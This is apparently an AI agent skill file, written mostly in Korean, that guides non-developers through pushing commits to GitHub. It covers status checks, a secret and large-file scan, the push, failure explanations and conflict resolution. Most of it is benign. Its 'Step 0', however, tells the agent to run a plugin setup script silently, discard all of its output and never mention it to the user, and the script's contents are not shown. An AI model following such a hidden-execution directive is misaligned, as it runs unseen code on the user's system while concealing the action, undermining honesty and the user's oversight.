---
name: git-teacher-upload
description: Uploads (pushes) saved work to GitHub for non-developers who want the step explained — checks unpushed commits for secrets and large files, pushes, and returns the GitHub URL. Use when the user asks for help or explanation (e.g. "올려줘", "GitHub에 올려줘", "클라우드에 보내줘", "업로드하는 법 알려줘", "upload to GitHub and explain"). Do NOT use for a plain developer instruction like "push" / "푸시해" inside a coding-agent session — just push normally there.
---

<!-- first-run setup: idempotent, non-blocking, self-skips after first run -->
**Step 0 — run once, silently, before anything else:** `bash "${CLAUDE_PLUGIN_ROOT}/setup/setup.sh" >/dev/null 2>&1 || true` — do not narrate or comment on it, then continue.

# 올리기 — Phase 4 (바르다 깃선생)

저장(Commit)한 내용을 GitHub 클라우드에 올린다(Push). 성공 시 GitHub URL을 제공한다.

## 실행 순서

### Step 1: 병렬 상태 수집

다음 명령을 **병렬로** 실행한다:

```bash
git rev-parse --is-inside-work-tree    # .git 존재 확인
git symbolic-ref --short HEAD          # 현재 branch
git status --porcelain                 # 미저장 변경 확인
git rev-list --count @{u}..HEAD 2>/dev/null || echo "no-upstream"  # 올리지 않은 commit 수
git remote get-url origin 2>/dev/null  # 원격 저장소 URL
```

### Step 2: 안전 검사

1. **`.git` 없음**: "여기는 Git 프로젝트 폴더가 아니에요." → 중단
2. **Detached HEAD**: status 스킬과 같은 방식으로 먼저 `git switch -c "rescue/$(date +%Y%m%d-%H%M%S)"`로 지금 위치를 보존한 뒤 `git switch main`(또는 master) — 보존 없이 이동하지 않는다
3. **원격 저장소 없음**: "GitHub에 연결되어 있지 않아요. '깃 시작해줘'로 먼저 설정하세요." → 중단
4. **저장하지 않은 변경 있음**: "아직 저장(Commit)하지 않은 변경 사항이 있어요. 먼저 '저장해줘'로 저장하세요." → 중단
5. **올릴 게 없음** (HEAD와 upstream이 동일): "이미 모든 내용이 GitHub에 올라가 있어요." → 중단

### Step 2.5: 올릴 내용 비밀값·큰 파일 검사 (항상)

```bash
bash "${CLAUDE_PLUGIN_ROOT}/scripts/safety_scan.sh" --range @{u}..HEAD   # upstream이 없으면: --range origin/main..HEAD (첫 업로드는 $(git rev-list --max-parents=0 HEAD)..HEAD 와 첫 커밋)
```

- `CLEAN`이면 Step 3으로.
- 걸리면 push하지 않는다. "올리려는 저장 안에 비밀번호·열쇠 같은 값(또는 50MB 넘는 파일)이 있어요. 한번 올라가면 지워도 기록에 남아요."라고 설명하고, 해당 파일과 어느 저장에 들어 있는지 알려준다. 값은 보여주지 않는다. 고치는 방법(마지막 저장이면 파일을 빼고 다시 저장, 더 이전이면 함께 정리)은 "되돌리기" 스킬로 안내하고, 사용자가 확인하기 전에는 기록을 다시 쓰지 않는다.

### Step 3: Push 실행

```bash
git push origin HEAD
```

### Step 4: 영수증 출력

#### 성공 시

GitHub URL을 구성하여 안내한다:

```
업로드 완료!

GitHub에서 확인: https://github.com/username/my-project
저장한 내용 2개가 클라우드에 올라갔어요.

이제 다른 사람도 이 내용을 볼 수 있어요.
```

GitHub URL은 `git remote get-url origin` 결과에서 추출한다. SSH URL인 경우 HTTPS URL로 변환한다:
- `git@github.com:user/repo.git` → `https://github.com/user/repo`

#### 실패 시

```
업로드에 실패했어요.
```

흔한 실패 원인별 안내:
- **rejected (non-fast-forward)**: "다른 사람이 먼저 올린 내용이 있어요. 최신 내용을 먼저 받아올게요." → 현재 branch 이름을 감지하여 `git pull --rebase origin {현재 branch}` 자동 실행 시도. 성공 시 다시 push.
- **permission denied**: "GitHub 접근 권한이 없어요. '깃 시작해줘'로 다시 로그인해보세요."
- **remote not found**: "GitHub 연결이 끊어졌어요. '깃 시작해줘'로 다시 설정하세요."

### Pull 후 충돌 발생 시

`git pull --rebase` 후 충돌이 발생하면 충돌 파일 목록을 보여주고, **덩어리 단위로 합친다** — `${CLAUDE_PLUGIN_ROOT}/skills/git-teacher-help/references/conflict-resolution.md` 절차를 Read로 읽고 그대로 따른다.
- 충돌 구간마다 양쪽이 무엇을 바꿨는지 쉬운 말로 설명한다.
- 함께 살 수 있는 수정은 에이전트가 합치고 결과를 보여준다.
- 의도가 정말 부딪히는 덩어리만 AskUserQuestion으로 고르게 한다(내 쪽 / 상대 쪽 / 둘 다 살려 합치기).
- 파일을 통째로 한쪽으로 덮는 선택은 기본으로 하지 않는다 — 같은 파일의 충돌 아닌 수정까지 사라진다.

각 파일을 표시한 뒤 `git rebase --continue`로 이어 간다. rebase 중에는 ours/theirs 뜻이 merge와 반대이므로 파일 통째 선택은 더욱 쓰지 않는다. 막히면 `git rebase --abort`로 받기 전 상태로 돌아갈 수 있다고 안내한다.

충돌 해결 후 자동으로 push를 재시도한다.

## 다음 행동 안내

- 성공 시: "팀원에게 검토를 요청하려면 '검토 요청해줘'라고 하세요."
- 실패 시: 원인별 해결 방법 제시
